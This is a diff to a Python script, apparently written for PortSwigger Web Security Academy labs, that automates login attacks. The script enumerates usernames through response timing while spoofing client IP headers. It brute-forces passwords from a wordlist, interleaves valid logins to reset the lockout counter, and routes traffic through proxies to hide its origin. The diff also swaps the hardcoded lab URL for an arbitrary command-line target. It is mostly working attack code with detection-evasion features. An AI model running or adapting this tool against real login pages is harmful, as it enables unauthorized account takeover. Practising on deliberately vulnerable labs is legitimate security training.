@@ -2,9 +2,12 @@
 import requests
 import random
 import time
-# import urllib3
+import sys
+import urllib3
 
-# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# Disable warnings if no CA cert used (NOT RECOMMENDED outside Portswigger environment)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 def generate_random_ip():
     """Generate a random IP address to spoof."""
@@ -14,14 +17,14 @@ def generate_random_ip():
 def get_proxies(proxy_type="burp"):
     """Return proxy settings based on the proxy type."""
     if proxy_type == "scraper":
-        api_key = "YOUR_SCRAPERAPI_KEY"
+        api_key = "YOUR_SCRAPERAPI_KEY" # If you want to use an alternative proxy to hid IP address
         return {
             "http": f"http://scraperapi:{api_key}@proxy-server.scraperapi.com:8001",
             "https": f"http://scraperapi:{api_key}@proxy-server.scraperapi.com:8001",
         }
-    elif proxy_type == "burp":
+    elif proxy_type == "burp": # Route traffic thru your burpsuite application
         return {
-            "http": "127.0.0.1:8080",
+            "http": "127.0.0.1:8080", # Your settings here
             "https": "127.0.0.1:8080",
         }
     return None  # No proxy
@@ -29,7 +32,7 @@ def get_proxies(proxy_type="burp"):
 
 def get_cookies(session, url, ca_cert_path=None):
     """Retrieve cookies automatically from the initial GET request."""
-    print(f"Using CA cert path: {ca_cert_path}")
+    print(f"Using CA cert path: {ca_cert_path}") ## ATTN: You must provide the entire chain of CA CERTs in one file
     try:
         response = session.get(url, verify=ca_cert_path)
         response.raise_for_status()  # Raise HTTPError for bad responses (4xx and 5xx)
@@ -104,7 +107,7 @@ def find_username_bypass_rate_limit(url, session, cookies, password, ca_cert_pat
                     print(f"Request failed for username: {username} with error: {e}")
                     failed_usernames.append(username)  # Log failed username
                     
-        # time.sleep(random.uniform(1, 5))  # Make it more difficult to detect brute force
+        # time.sleep(random.uniform(1, 5))  # Make it more difficult to detect brute force by adding a random delay
         
     print("Response Times:", response_times)    
     # Sort response times in descending order (slowest first)
@@ -129,6 +132,7 @@ def find_username_bypass_rate_limit(url, session, cookies, password, ca_cert_pat
         print("No valid username found.")
     return slowest_username
 
+
 def load_password_list():
     try:
         with open("res/passwords.txt", "r") as file:
@@ -137,6 +141,7 @@ def load_password_list():
         print("Usernames file not found.")
         return None
     return passwords
+
 
 def brute_force_password(url, session, cookies, username, ca_cert_path=None):
     """Brute-force the password for a valid username."""
@@ -176,7 +181,7 @@ def brute_force_password(url, session, cookies, username, ca_cert_path=None):
         except requests.exceptions.RequestException as e:
             print(f"Request failed for username: {user} with error: {e}")
                 
-        # time.sleep(random.uniform(1, 5)) # Make it more difficult to detect brute force 
+        # time.sleep(random.uniform(1, 5)) # Random delay btw requests 1 to 5 sec 
     
     print("Password brute-force unsuccessful.")
     return None
@@ -186,13 +191,13 @@ def alternating_brute_force(url, session, cookies, valid_user, valid_password, u
     """
     Alternates between login attempts with your account and brute-forcing the target account.
     """
-    verify_setting = ca_cert_path if ca_cert_path else False  # Use the CA cert path if provideds
+    verify_setting = ca_cert_path if ca_cert_path else False
     proxies = get_proxies()
     headers, data = generate_random_session(valid_user, valid_password, url)
     passwords = load_password_list()
 
     for password in passwords:
-        # Step 1: Login with your credentials to reset the brute-force counter
+        # Step 1: Login with credentials to reset brute-force counter
         print(f"Logging in with your account: {valid_user}")
         data_yours = {"username": valid_user, "password": valid_password}
         response_yours = session.post(
@@ -209,7 +214,7 @@ def alternating_brute_force(url, session, cookies, valid_user, valid_password, u
         else:
             print(f"Failed to log in with your account {valid_user}. Check your credentials or session.")
 
-        # Step 2: Attempt to brute-force the target username with the current password
+        # Step 2: Attempt to brute-force target username with current password
         print(f"Brute-forcing target account: {username_target} with password: {password}")
         data_target = {"username": username_target, "password": password}
         response_target = session.post(
@@ -228,14 +233,18 @@ def alternating_brute_force(url, session, cookies, valid_user, valid_password, u
         elif "You have made too many incorrect login attempts." in response_target.text:
             print("Server detected brute force. Restarting with a valid login.")
 
-        # time.sleep(random.uniform(1, 2))
+        # time.sleep(random.uniform(1, 2)) # Delay btw requests if desired for additional obfuscation
 
     print("Brute-force attack completed. No valid password found.")
     return None
         
         
 def main():
-    url = "https://0ac100c304cda03481d6ca5f002900a1.web-security-academy.net/login"
+    if len(sys.argv) < 2:
+        print("Usage: python script.py <target_url>")
+        sys.exit(1)
+
+    url = sys.argv[1]
 
     session = requests.Session()
 
@@ -243,15 +252,17 @@ def main():
 
     cookies = get_cookies(session, url, ca_cert_path)
 
-    ### LAB: Broken brute-force protection, IP block ###
+
+    ### START: Lab -- Broken brute-force protection, IP block ###
     # valid_user = "wiener"
     # valid_password = "peter"
     #
     # username_target = "carlos"
     # alternating_brute_force(url, session, cookies, valid_user, valid_password, username_target)
+    ### END: Lab -- Broken brute-force protection, IP block  ###
 
 
-    ### LAB: Username enumeration via response timing ###
+    ### START: Lab -- Username enumeration via response timing ###
     long_password = "howdy" * 20
     username = find_username_bypass_rate_limit(url, session, cookies, long_password, ca_cert_path)
 
@@ -278,7 +289,7 @@ def main():
     else:
         print("Username enumeration unsuccessful.")
         exit(0)
-        
+    ### END: Lab -- Username enumeration via response timing  ###
         
 if __name__ == "__main__":
     main()
